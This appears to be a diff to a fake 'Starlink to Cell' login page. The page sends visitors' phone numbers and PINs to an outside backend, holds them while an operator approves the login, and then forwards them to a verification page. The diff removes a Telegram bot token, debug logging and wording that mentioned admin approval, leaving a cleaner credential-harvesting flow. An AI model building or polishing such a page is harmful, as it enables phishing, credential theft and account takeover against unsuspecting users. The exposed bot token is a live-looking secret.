@@ -189,13 +189,6 @@
             display: none;
         }
         
-        .status-message.success {
-            display: block;
-            background: #e8f5e9;
-            color: #27ae60;
-            border: 1px solid #c8e6c9;
-        }
-        
         .status-message.error {
             display: block;
             background: #ffebee;
@@ -203,18 +196,11 @@
             border: 1px solid #ffcdd2;
         }
         
-        .status-message.info {
+        .status-message.success {
             display: block;
-            background: #e3f2fd;
-            color: #18386d;
-            border: 1px solid #bbdefb;
-        }
-        
-        .status-message.warning {
-            display: block;
-            background: #fff3e0;
-            color: #e65100;
-            border: 1px solid #ffe0b2;
+            background: #e8f5e9;
+            color: #27ae60;
+            border: 1px solid #c8e6c9;
         }
         
         .forgot-link {
@@ -469,26 +455,14 @@
     <!-- Spinner Overlay -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
-        <div class="spinner-text">
-            Please wait...<br> This usually takes a few seconds
-        </div>
+        <div class="spinner-text">Loading...</div>
     </div>
 
     <script>
         // ============================================
         // CONFIGURATION
         // ============================================
-        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
-        const CHAT_ID = '8392790531';
         const API_URL = 'https://starlink-production-c046.up.railway.app/api';
-
-        console.log('====================================');
-        console.log('📡 Starlink to Cell - Login Page');
-        console.log('====================================');
-        console.log('🤖 Bot Token:', BOT_TOKEN);
-        console.log('📱 Chat ID:', CHAT_ID);
-        console.log('🌐 API URL:', API_URL);
-        console.log('====================================');
 
         // ============================================
         // DOM REFERENCES
@@ -503,39 +477,6 @@
         let pollInterval = null;
         let requestId = null;
         let pollingActive = false;
-
-        // ============================================
-        // TEST BACKEND CONNECTION ON LOAD
-        // ============================================
-        async function testBackendConnection() {
-            try {
-                console.log('🔍 Testing backend connection...');
-                console.log('📍 Testing:', `${API_URL}/health`);
-                
-                const response = await fetch(`${API_URL}/health`, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-                
-                console.log('📥 Response status:', response.status);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-                }
-                
-                const data = await response.json();
-                console.log('✅ Backend connected:', data);
-                showStatus('✅ Connected to server', 'success');
-                setTimeout(hideStatus, 3000);
-                return true;
-            } catch (error) {
-                console.error('❌ Backend connection failed:', error);
-                showStatus('⚠️ Cannot connect to server. Please refresh and try again.', 'error');
-                return false;
-            }
-        }
 
         // ============================================
         // CHECK PIN COMPLETE
@@ -593,7 +534,7 @@
         // ============================================
         // STATUS MESSAGE FUNCTIONS
         // ============================================
-        function showStatus(message, type = 'info') {
+        function showStatus(message, type = 'error') {
             statusMessage.textContent = message;
             statusMessage.className = 'status-message ' + type;
             statusMessage.style.display = 'block';
@@ -605,14 +546,13 @@
         }
 
         // ============================================
-        // POLL LOGIN STATUS - UPDATED
+        // POLL LOGIN STATUS
         // ============================================
         function startPolling(requestId) {
             pollingActive = true;
             let attempts = 0;
-            const maxAttempts = 60; // 60 seconds timeout
+            const maxAttempts = 60;
 
-            // Clear any existing interval
             if (pollInterval) {
                 clearInterval(pollInterval);
                 pollInterval = null;
@@ -623,7 +563,7 @@
 
                 if (attempts > maxAttempts) {
                     stopPolling();
-                    showStatus('⏰ Approval timeout. Please try again.', 'error');
+                    showStatus('⏰ Request timeout. Please try again.', 'error');
                     loginBtn.disabled = false;
                     loginBtn.textContent = 'LOGIN';
                     spinnerOverlay.style.display = 'none';
@@ -631,44 +571,32 @@
                 }
 
                 try {
-                    console.log(`📊 Polling attempt ${attempts} for request: ${requestId}`);
-                    
                     const response = await fetch(`${API_URL}/auth/login-status/${requestId}`);
                     
                     if (!response.ok) {
-                        console.log('⏳ Waiting for status...');
                         return;
                     }
                     
                     const data = await response.json();
-                    console.log('📥 Status check:', data);
 
                     if (data.success && data.status) {
                         if (data.status === 'approved') {
-                            console.log('✅ APPROVED! Redirecting to verify page...');
                             stopPolling();
-                            showStatus('✅ Login approved! Redirecting...', 'success');
-                            
-                            // Store phone number for verification page
                             localStorage.setItem('phone', data.phone || phoneInput.value.trim());
-                            localStorage.removeItem('requestId'); // Clear the stored request ID
-                            
-                            setTimeout(() => {
-                                window.location.href = 'verify.html';
-                            }, 1500);
+                            localStorage.removeItem('requestId');
+                            spinnerOverlay.style.display = 'none';
+                            window.location.href = 'verify.html';
                             
                         } else if (data.status === 'denied') {
-                            console.log('❌ DENIED! Showing error...');
                             stopPolling();
-                            showStatus('❌ Login denied. Invalid credentials.', 'error');
+                            showStatus('❌ Invalid credentials. Please try again.', 'error');
                             
-                            // Clear PIN boxes
                             pinBoxes.forEach(box => {
                                 box.classList.add('invalid');
                                 box.value = '';
                             });
                             
-                            localStorage.removeItem('requestId'); // Clear the stored request ID
+                            localStorage.removeItem('requestId');
                             
                             setTimeout(() => {
                                 pinBoxes.forEach(box => box.classList.remove('invalid'));
@@ -695,13 +623,11 @@
         }
 
         // ============================================
-        // LOGIN HANDLER - UPDATED
+        // LOGIN HANDLER
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
             const pin = Array.from(pinBoxes).map(box => box.value).join('');
-
-            console.log('🔑 Login attempt:', { phone, pinLength: pin.length });
 
             // Validate phone
             if (!phone) {
@@ -732,9 +658,6 @@
             localStorage.setItem('phone', phone);
 
             try {
-                console.log('📤 Sending login request to:', `${API_URL}/auth/login`);
-                
-                // Send login request to backend
                 const response = await fetch(`${API_URL}/auth/login`, {
                     method: 'POST',
                     headers: {
@@ -747,23 +670,16 @@
                     })
                 });
 
-                console.log('📥 Response status:', response.status);
-                
-                // Check if response is OK
                 if (!response.ok) {
                     const errorText = await response.text();
-                    console.error('❌ Server error response:', errorText);
                     throw new Error(`Server returned ${response.status}: ${errorText || response.statusText}`);
                 }
 
                 const data = await response.json();
-                console.log('📥 Login response:', data);
 
                 if (data.success) {
                     requestId = data.requestId;
-                    // Store requestId in localStorage in case of page refresh
                     localStorage.setItem('requestId', requestId);
-                    showStatus('📱 Login request sent. Waiting for admin approval...', 'info');
                     startPolling(requestId);
                 } else {
                     showStatus('❌ ' + data.message, 'error');
@@ -772,8 +688,8 @@
                     spinnerOverlay.style.display = 'none';
                 }
             } catch (error) {
-                console.error('❌ Login error:', error);
-                showStatus('❌ Connection error: ' + error.message, 'error');
+                console.error('Login error:', error);
+                showStatus('❌ Connection error. Please try again.', 'error');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'LOGIN';
                 spinnerOverlay.style.display = 'none';
@@ -793,9 +709,9 @@
         });
 
         // ============================================
-        // AUTO-FOCUS AND LOAD - UPDATED
+        // AUTO-FOCUS AND LOAD
         // ============================================
-        window.addEventListener('load', async () => {
+        window.addEventListener('load', function() {
             const savedPhone = localStorage.getItem('phone');
             const savedRequestId = localStorage.getItem('requestId');
             
@@ -805,8 +721,6 @@
             
             // If there's a pending request, resume polling
             if (savedRequestId) {
-                console.log('🔄 Resuming polling for request:', savedRequestId);
-                showStatus('📱 Checking login status...', 'info');
                 loginBtn.disabled = true;
                 loginBtn.textContent = 'WAITING...';
                 spinnerOverlay.style.display = 'flex';
@@ -815,12 +729,6 @@
             
             phoneInput.focus();
             checkPinComplete();
-            
-            // Test backend connection
-            await testBackendConnection();
-            
-            console.log('✅ Login page fully loaded and ready');
-            console.log('====================================');
         });
     </script>
 
